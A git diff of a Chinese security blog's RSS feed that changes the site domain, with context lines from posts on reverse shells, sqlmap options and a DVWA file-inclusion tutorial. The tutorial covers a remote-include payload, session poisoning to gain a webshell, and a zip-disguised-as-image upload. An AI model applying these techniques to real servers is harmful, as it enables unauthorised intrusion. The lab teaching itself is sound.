@@ -2,17 +2,17 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Security on 猫猫の博客</title>
-        <link>https://blog.nanosec.site/categories/security/</link>
+        <link>https://kira-pgr.github.io/categories/security/</link>
         <description>Recent content in Security on 猫猫の博客</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Thu, 27 Jan 2022 01:03:14 -0500</lastBuildDate><atom:link href="https://blog.nanosec.site/categories/security/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 27 Jan 2022 01:03:14 -0500</lastBuildDate><atom:link href="https://kira-pgr.github.io/categories/security/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>论如何优雅地弹Shell</title>
-        <link>https://blog.nanosec.site/p/%E8%AE%BA%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E5%BC%B9shell/</link>
+        <link>https://kira-pgr.github.io/p/%E8%AE%BA%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E5%BC%B9shell/</link>
         <pubDate>Mon, 30 Jan 2023 13:57:43 +0800</pubDate>
         
-        <guid>https://blog.nanosec.site/p/%E8%AE%BA%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E5%BC%B9shell/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/%E8%AE%BA%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E5%BC%B9shell/cover.jpg" alt="Featured image of post 论如何优雅地弹Shell" /&gt;&lt;h1 id=&#34;论如何优雅地弹shell&#34;&gt;论如何优雅地弹Shell&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/%E8%AE%BA%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E5%BC%B9shell/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/%E8%AE%BA%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E5%BC%B9shell/cover.jpg" alt="Featured image of post 论如何优雅地弹Shell" /&gt;&lt;h1 id=&#34;论如何优雅地弹shell&#34;&gt;论如何优雅地弹Shell&lt;/h1&gt;
 &lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
 &lt;p&gt;最近PGR酱的刷&lt;code&gt;GitHub&lt;/code&gt;的时候无意间看到一个工具&amp;ndash;&lt;a class=&#34;link&#34; href=&#34;https://github.com/Fahrj/reverse-ssh&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;reverse-ssh&lt;/a&gt;&lt;/p&gt;
@@ -61,11 +61,11 @@
         </item>
         <item>
         <title>Web安全:sqlmap常用参数整理</title>
-        <link>https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/</link>
+        <link>https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/</link>
         <pubDate>Wed, 16 Nov 2022 17:43:04 +0800</pubDate>
         
-        <guid>https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/cover.jpg" alt="Featured image of post Web安全:sqlmap常用参数整理" /&gt;&lt;h1 id=&#34;web安全sqlmap常用参数整理&#34;&gt;Web安全:sqlmap常用参数整理&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/cover.jpg" alt="Featured image of post Web安全:sqlmap常用参数整理" /&gt;&lt;h1 id=&#34;web安全sqlmap常用参数整理&#34;&gt;Web安全:sqlmap常用参数整理&lt;/h1&gt;
 &lt;p&gt;在sqlmap梭哈的时候总是记不住参数?&lt;/p&gt;
 &lt;p&gt;打开帮助文档又因为看到一大堆&lt;del&gt;嘤glish&lt;/del&gt;英文感觉头变大了?&lt;/p&gt;
 &lt;p&gt;于是乎，由于要消灭以上两种问题, 本篇文章就诞生了&lt;/p&gt;
@@ -171,10 +171,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
 &lt;hr&gt;
 &lt;p&gt;5.让sqlmap自动选择默认的选项&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/2022-11-17_22-29.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/2022-11-17_22-29.png&#34;
 	width=&#34;1156&#34;
 	height=&#34;688&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/2022-11-17_22-29_huf03febae7f1fd2647dbd8a0837fc82ef_676707_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/2022-11-17_22-29_huf03febae7f1fd2647dbd8a0837fc82ef_676707_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/2022-11-17_22-29_huf03febae7f1fd2647dbd8a0837fc82ef_676707_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/2022-11-17_22-29_huf03febae7f1fd2647dbd8a0837fc82ef_676707_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;如图，大写的那个字母就是默认选项辣!!&#34;
@@ -238,11 +238,11 @@
         </item>
         <item>
         <title>Web安全:文件包含漏洞</title>
-        <link>https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</link>
+        <link>https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</link>
         <pubDate>Tue, 13 Sep 2022 20:07:24 +0800</pubDate>
         
-        <guid>https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</guid>
-        <description>&lt;img src="https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cover.jpg" alt="Featured image of post Web安全:文件包含漏洞" /&gt;&lt;h1 id=&#34;web安全文件包含漏洞&#34;&gt;Web安全:文件包含漏洞&lt;/h1&gt;
+        <guid>https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</guid>
+        <description>&lt;img src="https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cover.jpg" alt="Featured image of post Web安全:文件包含漏洞" /&gt;&lt;h1 id=&#34;web安全文件包含漏洞&#34;&gt;Web安全:文件包含漏洞&lt;/h1&gt;
 &lt;h2 id=&#34;漏洞原理&#34;&gt;漏洞原理&lt;/h2&gt;
 &lt;p&gt;开发者在代码中调用了&lt;strong&gt;外部文件&lt;/strong&gt;，且调用的文件名受&lt;strong&gt;用户输入&lt;/strong&gt;的影响，&lt;/p&gt;
 &lt;p&gt;在&lt;strong&gt;权限控制不严谨&lt;/strong&gt;的情况下会产生文件包含漏洞(File Inclusion)&lt;/p&gt;
@@ -300,10 +300,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;payload3远程包含&#34;&gt;payload3:远程包含&lt;/h4&gt;
 &lt;p&gt;由于DWVA的环境，Web应用可以包含远程文件&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://server/file
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10.png&#34;
 	width=&#34;1178&#34;
 	height=&#34;212&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10_hu713ba8293390ba2624344f75ad4f00d0_45935_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10_hu713ba8293390ba2624344f75ad4f00d0_45935_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10_hu713ba8293390ba2624344f75ad4f00d0_45935_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10_hu713ba8293390ba2624344f75ad4f00d0_45935_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;包含了猫猫的文件，就要付出代价 :&amp;gt;&#34;
@@ -408,10 +408,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;//可以将include换成其他函数测试
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48.png&#34;
 	width=&#34;1148&#34;
 	height=&#34;216&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48_hu3bbb01bb25e975d50471ae10ec79c80f_41436_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48_hu3bbb01bb25e975d50471ae10ec79c80f_41436_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48_hu3bbb01bb25e975d50471ae10ec79c80f_41436_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48_hu3bbb01bb25e975d50471ae10ec79c80f_41436_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;演示&#34;
@@ -459,10 +459,10 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们发现此php会将获取到的GET型&lt;code&gt;ctfs&lt;/code&gt;变量的值存入到session中，也就是可以控制session中的内容&lt;/p&gt;
 &lt;p&gt;我们通过phpinfo页面发现了session的存储路径&lt;code&gt;/var/lib/php/session&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-01.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-01.png&#34;
 	width=&#34;837&#34;
 	height=&#34;348&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-01_hu99336d89a252b08552b486ac53ec193c_64741_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-01_hu99336d89a252b08552b486ac53ec193c_64741_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-01_hu99336d89a252b08552b486ac53ec193c_64741_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-01_hu99336d89a252b08552b486ac53ec193c_64741_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;session储存位置&#34;
@@ -475,10 +475,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;当访问&lt;code&gt;http://ip/path/ctfs.php?ctfs=test&lt;/code&gt; 后，会在&lt;code&gt;/var/lib/php/session&lt;/code&gt;目录下存储session的值。&lt;/p&gt;
 &lt;p&gt;session的文件名为&lt;code&gt;sess_+sessionid&lt;/code&gt;，&lt;code&gt;sessionid&lt;/code&gt;可以通过开发者模式获取。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-25.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-25.png&#34;
 	width=&#34;1392&#34;
 	height=&#34;315&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-25_hu1d79fd9b194dc4563ab94eaf61d33c53_81478_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-25_hu1d79fd9b194dc4563ab94eaf61d33c53_81478_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-25_hu1d79fd9b194dc4563ab94eaf61d33c53_81478_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_00-25_hu1d79fd9b194dc4563ab94eaf61d33c53_81478_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;获取sessionid&#34;
@@ -491,10 +491,10 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;所以session的文件名为&lt;code&gt;sess_p44b454elq0mfe2vopqvfm7m37&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;去服务器上查看，果然有该文件, 而且我们刚刚的test也被写入了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/Snipaste_2022-09-11_00-29-20.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/Snipaste_2022-09-11_00-29-20.png&#34;
 	width=&#34;1502&#34;
 	height=&#34;96&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/Snipaste_2022-09-11_00-29-20_hu01538e5ef18fa2212e5466e6783bf631_21167_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/Snipaste_2022-09-11_00-29-20_hu01538e5ef18fa2212e5466e6783bf631_21167_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/Snipaste_2022-09-11_00-29-20_hu01538e5ef18fa2212e5466e6783bf631_21167_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/Snipaste_2022-09-11_00-29-20_hu01538e5ef18fa2212e5466e6783bf631_21167_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Hello Test! (雾&#34;
@@ -517,10 +517,10 @@
 &lt;blockquote&gt;
 &lt;p&gt;我本地使用的是&lt;code&gt;AntSword&lt;/code&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-15.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-15.png&#34;
 	width=&#34;1347&#34;
 	height=&#34;872&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-15_hu607d86bce2c1c80ed86559d4c2fc11ef_79193_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-15_hu607d86bce2c1c80ed86559d4c2fc11ef_79193_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-15_hu607d86bce2c1c80ed86559d4c2fc11ef_79193_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-15_hu607d86bce2c1c80ed86559d4c2fc11ef_79193_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -529,10 +529,10 @@
 		data-flex-basis=&#34;370px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-16.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-16.png&#34;
 	width=&#34;1347&#34;
 	height=&#34;876&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-16_hu73466ecf08a8c01529d6debc7f16513b_58685_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-16_hu73466ecf08a8c01529d6debc7f16513b_58685_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-16_hu73466ecf08a8c01529d6debc7f16513b_58685_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_11-16_hu73466ecf08a8c01529d6debc7f16513b_58685_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;shell,斯哈斯哈!&#34;
@@ -576,10 +576,10 @@
 &lt;p&gt;如果在某些场合发现明明存在文件包含漏洞但是某些东西无法读取的话，&lt;/p&gt;
 &lt;p&gt;可以base64编码解决&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-30.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-30.png&#34;
 	width=&#34;1399&#34;
 	height=&#34;167&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-30_huf59359fb16ad256dee613187379c754b_55179_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-30_huf59359fb16ad256dee613187379c754b_55179_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-30_huf59359fb16ad256dee613187379c754b_55179_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-30_huf59359fb16ad256dee613187379c754b_55179_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 	
@@ -588,10 +588,10 @@
 		data-flex-basis=&#34;2010px&#34;
 	
 &gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-27.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-27.png&#34;
 	width=&#34;999&#34;
 	height=&#34;426&#34;
-	srcset=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-27_hua7afb98c03274a9720c36f781edff5e9_24583_480x0_resize_box_3.png 480w, https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-27_hua7afb98c03274a9720c36f781edff5e9_24583_1024x0_resize_box_3.png 1024w&#34;
+	srcset=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-27_hua7afb98c03274a9720c36f781edff5e9_24583_480x0_resize_box_3.png 480w, https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-27_hua7afb98c03274a9720c36f781edff5e9_24583_1024x0_resize_box_3.png 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;读取配置文件&#34;
@@ -613,10 +613,10 @@
 &lt;/blockquote&gt;
 &lt;h4 id=&#34;过程-1&#34;&gt;过程&lt;/h4&gt;
 &lt;p&gt;写一个php文件，然后用zip压缩为zip文件，然后将后缀改为png等其他格式,然后传入服务器。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://blog.nanosec.site/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-44.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-11_12-44.png&#34;
 	width=&#34;1261&#34;
 	height=&#34;649&#34;
